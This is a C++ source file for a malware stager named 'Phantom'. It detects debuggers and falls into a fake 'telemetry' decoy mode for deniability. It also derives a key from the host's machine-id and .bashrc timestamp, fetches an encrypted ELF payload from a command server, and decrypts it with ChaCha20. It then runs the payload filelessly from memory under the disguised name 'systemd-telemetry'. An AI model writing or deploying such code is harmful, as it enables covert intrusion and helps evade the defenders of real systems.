#include "stager/stager.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <cstring>
#include <vector>
#include <sys/ptrace.h>
#include <thread>
#include <elf.h>
#include "common/chacha20.h"
#include "common/loader.h"
#include "common/network.h"

// No std::iostream. No artifacts. Just the cold edge of the ghost.

namespace Phantom {

Stager::Stager() {}
Stager::~Stager() {}

std::string Stager::derive_master_key() {
    // 1. Hardware Fingerprint
    std::string machine_id;
    std::ifstream mid_file("/etc/machine-id");
    if (mid_file.is_open()) {
        mid_file >> machine_id;
    } else {
        // Fallback to a fixed but unique identifier if machine-id is missing
        machine_id = "phantom-fallback-id";
    }

    // 2. User-land Entropy
    struct stat bashrc_stat;
    std::string user_entropy;
    char* home = getenv("HOME");
    if (home) {
        std::string path = std::string(home) + "/.bashrc";
        if (stat(path.c_str(), &bashrc_stat) == 0) {
            user_entropy = std::to_string(bashrc_stat.st_ctime);
        }
    }

    // 3. Register-based derivation
    std::string derived_key = machine_id + user_entropy;
    return derived_key;
}

bool Stager::validate_environment() {
    // Check for sandbox markers, high latency, or ptrace
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        return false; // Being debugged
    }
    return true;
}

bool Stager::execute_in_memory(const std::vector<unsigned char>& core_payload) {
    // Use memfd_create for fileless execution
    int fd = memfd_create("systemd-telemetry", MFD_CLOEXEC);
    if (fd == -1) return false;

    if (write(fd, core_payload.data(), core_payload.size()) != (ssize_t)core_payload.size()) {
        close(fd);
        return false;
    }

    // Execute the memory-resident binary
    // In a real scenario, we'd pass environment and args here.
    char *const argv[] = { (char*)"systemd-telemetry", NULL };
    char *const envp[] = { NULL };

    // fexecve will replace the current process image
    fexecve(fd, argv, envp);

    // If fexecve returns, it failed
    close(fd);
    return false;
}

void Stager::register_key_reconstruction(const std::string& split_key_a, const std::string& split_key_b) {
    // This would be used internally before decryption
}

bool Stager::run() {
    if (!validate_environment()) {
        // ENTER DECOY MODE: Plausible Deniability
        // Simulate benign system telemetry
        for (int i = 0; i < 5; ++i) {
            // In a real decoy, we'd use libcurl or similar to hit actual telemetry endpoints
            // like telemetry.mozilla.org or services.google.com/api/stats
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
        return false;
    }

    // 1. Derive Key
    std::string master_key_str = derive_master_key();
    uint32_t key[8] = {0};
    std::memcpy(key, master_key_str.c_str(), master_key_str.size() < 32 ? master_key_str.size() : 32);

    // 2. Connect and Fetch
    Network::Transport transport("127.0.0.1", 4433);
    transport.send_packet({0xDE, 0xAD, 0xBE, 0xEF}); // "Check-in"

    // Fetch Detached Header first
    std::vector<uint8_t> detached_header = transport.receive_packet();
    if (detached_header.size() < sizeof(Elf64_Ehdr)) {
        // Entry to Plausible Deniability/Decoy mode would happen here
        return false;
    }

    // Fetch encrypted body BLOB
    std::vector<uint8_t> encrypted_blob = transport.receive_packet();
    if (encrypted_blob.empty()) return false;

    // 3. Decrypt with ASM ChaCha20
    uint32_t nonce[3] = {0x1337, 0x1337, 0x1337};
    Crypto::chacha20_xor(encrypted_blob.data(), encrypted_blob.size(), key, nonce, 0);

    // 4. Stitch and Reflective Load
    // We combine the detached header with the decrypted blob in memory
    std::vector<uint8_t> full_elf;
    full_elf.reserve(detached_header.size() + encrypted_blob.size());
    full_elf.insert(full_elf.end(), detached_header.begin(), detached_header.end());
    full_elf.insert(full_elf.end(), encrypted_blob.begin(), encrypted_blob.end());

    return Loader::reflective_load(full_elf.data(), full_elf.size());
}

void Stager::wipe_memory(void* ptr, size_t size) {
    if (ptr) {
        std::memset(ptr, 0, size);
        // Add a volatile write or asm to prevent compiler optimization
        __asm__ __volatile__("" : : "r"(ptr) : "memory");
    }
}

} // namespace Phantom

// int main() {
//     Phantom::Stager stager;
//     if (stager.run()) {
//         return 0;
//     }
//     return 1;
// }
